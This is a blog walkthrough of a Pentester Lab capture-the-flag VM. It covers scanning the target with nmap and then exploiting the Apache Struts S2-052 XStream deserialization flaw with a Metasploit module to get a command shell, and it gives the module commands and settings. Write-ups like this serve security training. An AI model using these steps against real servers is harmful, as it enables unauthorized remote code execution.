
								
																		Hack The Vulnhub Pentester Lab: S2-052
								
								
								
								
									
										posted inCTF Challenges									
									
									
									on June 25, 2018
									
									 by										
											Raj Chandel
										
										
									
									
									
									
	SHARE
	
	
		
			
			
			
				(function(d, s, id)
				{
					var js, fjs = d.getElementsByTagName(s)[0];
					if (d.getElementById(id)) return;
					js = d.createElement(s); js.id = id;
					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
					fjs.parentNode.insertBefore(js, fjs);
				}(document, 'script', 'facebook-jssdk'));
			
			
			
		
		
		
		
						Tweet
			
			
				!function(d, s, id)
				{
					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
				}(document, "script", "twitter-wjs");
			
		
		
		
		
			
			
			
			
			
			  (function()
			  {
				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
				po.src = 'https://apis.google.com/js/plusone.js';
				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
			  })();
			
		
		
		
		
						
			
			
			
		
		
	
	
	
									
																	
								
								
																
								
									Hello friend!! Today we are going to exploit another VM lab which is designed by Pentester Lab covers the exploitation of the Struts S2-052 vulnerability. The REST Plugin is using an XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.
Source: https://cwiki.apache.org/confluence/display/WW/S2-052
Table of Content

Introduction
Download VM
Enumeration (Nmap)
Surfing Port 80
Exploit the target (Metasploit)

Let’s Exploit!!
Download it from here and run this VM. Then check its network configuration through ifconfig command.

Since target belongs to 192.168.1.103 network, let’s go for its enumeration with help of nmap following command to identify running service and version.

		
		
			
			
			
			
nmap -A 192.168.1.103
			
				
					
				
					1
				
						nmap -A 192.168.1.103
					
				
			
		

From nmap scanning result we enumerated the following details:
Http-server-header: Apache-coyote/1.1
Http-title: orders
Requested resource: /order.xhtml

So when we have explored /order.xhtml through the web browser it put up the following webpage.

Further, we explore user Bob it brings us inside order 3 web page.

Since the author has already declared that is VM is vulnerable to the Struts S2-052 therefore with the help of the following module of Metasploit we can directly exploit it to obtain command shell of target VM.

		
		
			
			
			
			
msf &gt; use exploit/multi/http/struts2_rest_xstream
msf exploit(multi/http/struts2_rest_xstream) &gt; set rhost 192.168.1.103
msf exploit(multi/http/struts2_rest_xstream) &gt; set rport 80
msf exploit(multi/http/struts2_rest_xstream) &gt; set TARGETURI /orders/3
msf exploit(multi/http/struts2_rest_xstream) &gt; exploit
			
				
					
				
					12345
				
						msf &gt; use exploit/multi/http/struts2_rest_xstreammsf exploit(multi/http/struts2_rest_xstream) &gt; set rhost 192.168.1.103msf exploit(multi/http/struts2_rest_xstream) &gt; set rport 80msf exploit(multi/http/struts2_rest_xstream) &gt; set TARGETURI /orders/3msf exploit(multi/http/struts2_rest_xstream) &gt; exploit
					
				
			
		

BOOOOOOOM!!! Here we owned the command shell of victim’s vm.

Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
																	
								
								
															